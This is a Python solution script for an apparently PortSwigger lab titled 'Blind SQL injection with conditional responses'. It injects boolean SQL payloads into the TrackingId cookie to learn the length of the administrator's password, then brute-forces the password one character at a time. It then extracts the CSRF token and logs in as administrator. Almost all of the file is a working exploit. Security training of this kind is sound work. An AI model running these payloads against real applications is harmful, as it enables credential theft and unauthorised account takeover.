################################################################################
#
# Lab: Blind SQL injection with conditional responses
#
# Hack Steps:
#      1. Inject payload into 'TrackingId' cookie to determine the length of
#         administrator's password based on conditional responses
#      2. Modify the payload to brute force the administrator's password
#      3. Fetch the login page
#      4. Extract the csrf token and session cookie
#      5. Login as the administrator
#      6. Fetch the administrator profile
#
################################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0a170001045a0dac82a9b0d1009d00fb.web-security-academy.net"

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "TrackingId")

    print(Fore.WHITE + "⦗1⦘ Determining password length.. ")
    
    password_length = determin_password_length()

    print(Fore.WHITE + "⦗2⦘ Brute forcing password.. ")
    
    admin_password = brute_force_password(password_length)

    print(Fore.WHITE + "\n⦗3⦘ Fetching the login page.. ", end="", flush=True)
   
    login_page = fetch("/login")
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)

    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Logging in as the administrator.. ", end="", flush=True)
    
    data = { "username": "administrator", "password": admin_password, "csrf": csrf_token }
    cookies = { "session": session }
    admin_login = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Fetching the administrator profile.. ", end="", flush=True)

    admin_session = admin_login.cookies.get("session")
    cookies = { "session": admin_session }
    fetch("/my-account", cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def determin_password_length():
    for length in range(1, 50):
        print(Fore.WHITE + "❯❯ Checking if length = " + Fore.YELLOW + str(length), flush=True, end='\r')
        
        payload = f"' or length((select password from users where username = 'administrator')) = {length} -- -"
        cookies = { "TrackingId": payload }
        injection_response = fetch("/filter?category=Pets", cookies)

        if text_exist_in_response("Welcome back!", injection_response):
            print(Fore.WHITE + "❯❯ Checking if password length = " + Fore.YELLOW + str(length) + Fore.WHITE + " [ Correct length: " + Fore.GREEN + str(length) + Fore.WHITE + " ]")

            return length
        else:
            continue
    
    print(Fore.RED + "⦗!⦘ Failed to determine the length")
    exit(1)


def brute_force_password(password_length):
    correct_password = []

    for position in range(1, password_length+1):
        for character in "0123456789abcdefghijklmnopqrstuvwxyz":
            print(Fore.WHITE + "❯❯ Checking if char at position " + Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character, flush=True, end='\r')
            
            payload = f"' or substring((select password from users where username = 'administrator'), {position}, 1) = '{character}' -- -"
            cookies = { "TrackingId": payload }
            injection_response = fetch("/filter?category=Pets", cookies)

            if text_exist_in_response("Welcome back!", injection_response):
                correct_password.append(character)
                
                print(Fore.WHITE + "❯❯ Checking if char at position " + Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character + Fore.WHITE + " [ Correct password: " + Fore.GREEN + "".join(correct_password) + Fore.WHITE + " ]", flush=True, end='\r')
                break
            else:
                continue
            
    return "".join(correct_password)


def text_exist_in_response(text, response):
    result = re.findall(text, response.text)
    if len(result) != 0:
        return True
    else:
        return False


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()